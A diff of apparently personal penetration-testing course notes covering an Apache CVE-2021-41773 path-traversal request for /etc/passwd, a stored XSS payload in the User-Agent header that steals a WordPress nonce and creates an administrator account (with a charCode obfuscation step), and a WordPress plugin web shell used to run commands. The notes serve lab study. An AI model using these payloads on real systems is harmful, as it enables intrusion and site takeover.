@@ -589,9 +589,11 @@
 - 7.3.1 NSE vulnerability script
   `sudo nmap -sV -p 443 --script "vuln" 192.168.173.13`
 - 7.3.2 working with NSE script
-  [Apache HTTP Server 2.4.49 - Path Traversal (CVE-2021-41773)](https://www.exploit-db.com/exploits/50383)
-  `sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse`
-  `sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.173.13`
+  **Capstone Labs:** Follow the steps above to perform the vulnerability scan with the custom NSE script on VM #1.
+  
+  [Apache HTTP Server 2.4.49 - Path Traversal (CVE-2021-41773)](https://www.exploit-db.com/exploits/50383)  
+  `sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse`  
+  `sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.173.13`  
   `curl -s --path-as-is http://192.168.173.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`  
 
 ### Introduction to Web Application Attacks  
@@ -624,9 +626,51 @@
   - find flag in html, css, js
     burp suite http history + filter by search item 'flag' + browser console run function
 - 8.4 cross-site scripting
-  - ddd
-  - ddd
-  - ddd  
+  - XSS attack in user-agent - create new user and privilege via xss
+    - login http://offsecwp/wp-login.php (admin, password)
+    - JSCompress
+      ```
+      var ajaxRequest = new XMLHttpRequest();
+      var requestURL = "/wp-admin/user-new.php";
+      var nonceRegex = /ser" value="([^"]*?)"/g;
+      ajaxRequest.open("GET", requestURL, false);
+      ajaxRequest.send();
+      var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+      var nonce = nonceMatch[1];
+      var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+      ajaxRequest = new XMLHttpRequest();
+      ajaxRequest.open("POST", requestURL, true);
+      ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      ajaxRequest.send(params);
+      ```
+    - Run this function and get the encoded js
+      ```
+      function encode_to_javascript(string) {
+            var input = string
+            var output = '';
+            for(pos = 0; pos < input.length; pos++) {
+                output += input.charCodeAt(pos);
+                if(pos != (input.length - 1)) {
+                    output += ",";
+                }
+            }
+            return output;
+        }
+        
+      let encoded = encode_to_javascript('var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
+      console.log(encoded)
+      ```
+    - intercept the burp request and modify the user-agent
+      ```
+      <script>eval(String.fromCharCode(118,97,114,32,97,106,97,....))</script>
+      ```
+  - **Capstone Lab**: craft a wordpress plugin that embeds a web shell and enumerate the target system (locate the flag)  
+    - https://github.com/jckhmr/simpletools/blob/master/wonderfulwebshell/wonderfulwebshell.php
+    - `nano webshell.php`
+    - `zip webshell.zip webshell.php`
+    - Upload plugin.zip and activate
+    - `http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=find%20/%20-name%20flag%202%3E/dev/null`: find flag  
+    - `http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=cat%20/tmp/flag`  
     
 ### Password Attacks  
 - 16.1.1 SSH and RDP
